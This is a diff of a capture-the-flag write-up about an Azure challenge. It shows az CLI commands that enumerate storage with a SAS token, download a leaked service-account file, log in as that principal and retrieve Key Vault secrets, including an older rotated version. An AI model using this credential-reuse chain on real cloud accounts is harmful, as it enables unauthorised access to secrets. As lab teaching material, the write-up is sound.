@@ -27,9 +27,11 @@ The challenge revolves around investigating a cloud-hosted web application backe
 
 ## ☁️ Azure Storage Enumeration
 
-Using the provided Azure Cloud Shell, I saved the Storage Account name and SAS token before enumerating the available blob containers.
+Before beginning, I verified the current account context. Then, using the provided Azure Cloud Shell, I saved the Storage Account name and SAS token before enumerating the available blob containers.
 
 ```bash
+az account show
+
 ACCOUNT='cryptocabanaf5scjagc'
 SAS='?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D'
 
@@ -42,18 +44,21 @@ Three containers were returned:
 * `backups`
 * `vault`
 
-The `vault` container looked the most interesting, so I listed its contents.
+The `vault` container looked the most interesting, so I listed its contents and downloaded the available files.
 
 ```bash
-az storage blob list --account-name "$ACCOUNT" --container-name vault --sas-token "$SAS" --query '[].{Name:name,Size:properties.contentLength,Modified:properties.lastModified}' --output table
+az storage blob list --account-name "$ACCOUNT" --container-name 'vault' --sas-token "$SAS" --query '[].{Name:name,Size:properties.contentLength,Modified:properties.lastModified}' --output table
+
+az storage blob download --account-name "$ACCOUNT" --container-name 'vault' --name 'seed_phrase.txt' --sas-token "$SAS" --file seed_phrase.txt --output none
+
+az storage blob download --account-name "$ACCOUNT" --container-name 'vault' --name 'backup-service-account.json' --sas-token "$SAS" --file backup-service-account.json --output none
 ```
 
-The container contained two files:
+After downloading both blobs, the seed phrase turned out to be a decoy, while `backup-service-account.json` exposed a **Client ID**, **Client Secret**, **Tenant ID**, and **Key Vault** name. 
 
-* `seed_phrase.txt`
-* `backup-service-account.json`
-
-After downloading both blobs, the seed phrase turned out to be a decoy, while `backup-service-account.json` exposed a **Client ID**, **Client Secret**, **Tenant ID**, and **Key Vault** name.
+```bash
+jq . backup-service-account.json
+```
 
 <p align="center">
   <img src="images/day9-storage.png" alt="Azure CLI enumerating blob containers and downloading files" width="800">
@@ -63,7 +68,7 @@ After downloading both blobs, the seed phrase turned out to be a decoy, while `b
 
 ## 🔐 Azure Key Vault Enumeration
 
-Using the credentials from the JSON file, I authenticated as the exposed service principal.
+Using the credentials parsed from the JSON file, I authenticated as the exposed service principal and verified the login context.
 
 ```bash
 CLIENT_ID=$(jq -r '.client_id' backup-service-account.json)
@@ -71,27 +76,37 @@ CLIENT_SECRET=$(jq -r '.client_secret' backup-service-account.json)
 TENANT_ID=$(jq -r '.tenant_id' backup-service-account.json)
 VAULT_NAME=$(jq -r '.key_vault_name' backup-service-account.json)
 
-az login --service-principal --username "$CLIENT_ID" --password "$CLIENT_SECRET" --tenant "$TENANT_ID" --allow-no-subscriptions
+az login --service-principal --username "$CLIENT_ID" --password "$CLIENT_SECRET" --tenant "$TENANT_ID" --allow-no-subscriptions --output none
+
+az account show --query user --output json
 ```
 
-After verifying the login with `az account show`, I listed the available Key Vault secrets.
+After verifying the login, I listed the available Key Vault secrets and attempted to retrieve their values.
 
 ```bash
 az keyvault secret list --vault-name "$VAULT_NAME" --query '[].{Name:name,Enabled:attributes.enabled,Updated:attributes.updated}' --output table
+
+az keyvault secret show --vault-name "$VAULT_NAME" --name 'key-shard-1' --query value --output tsv
+az keyvault secret show --vault-name "$VAULT_NAME" --name 'key-shard-2' --query value --output tsv
+az keyvault secret show --vault-name "$VAULT_NAME" --name 'key-shard-3' --query value --output tsv
 ```
 
-The vault contained four secrets, including three key shards. Retrieving `key-shard-1` and `key-shard-3` revealed two parts of the flag, while `key-shard-2` contained a note explaining that the secret had been rotated.
+Retrieving `key-shard-1` and `key-shard-3` revealed two parts of the flag, while `key-shard-2` contained a note explaining that the secret had been rotated. 
 
 <p align="center">
   <img src="images/day9-keyvault.png" alt="Listing Azure Key Vault secrets and retrieving key shards" width="800">
 </p>
 
-Since Azure Key Vault stores previous secret versions, I listed the available versions of `key-shard-2` and retrieved the older one.
+Since Azure Key Vault stores previous secret versions, I listed the available versions of `key-shard-2` and retrieved the older one using its specific ID.
 
 ```bash
-az keyvault secret list-versions --vault-name "$VAULT_NAME" --name key-shard-2 --output table
+az keyvault secret list-versions --vault-name "$VAULT_NAME" --name 'key-shard-2' --query '[].{Version:id,Created:attributes.created,Updated:attributes.updated,Enabled:attributes.enabled}' --output table
 
-az keyvault secret show --vault-name "$VAULT_NAME" --name key-shard-2 --version 3d6492d2c6f74123bc754a9ded22b2a0 --query value --output tsv
+az keyvault secret show --vault-name "$VAULT_NAME" --name 'key-shard-2' --version 'OLD_VERSION_ID' --query value --output tsv
+
+az keyvault secret list-versions --vault-name "$VAULT_NAME" --name 'key-shard-2' --query '[].{Version:id,Created:attributes.created,Updated:attributes.updated,Enabled:attributes.enabled}' --output table
+
+az keyvault secret show --vault-name "$VAULT_NAME" --name 'key-shard-2' --version '3d6492d2c6f74123bc754a9ded22b2a0' --query value --output tsv
 ```
 
 The older version contained the missing flag fragment. Combining all three shards revealed the complete flag.
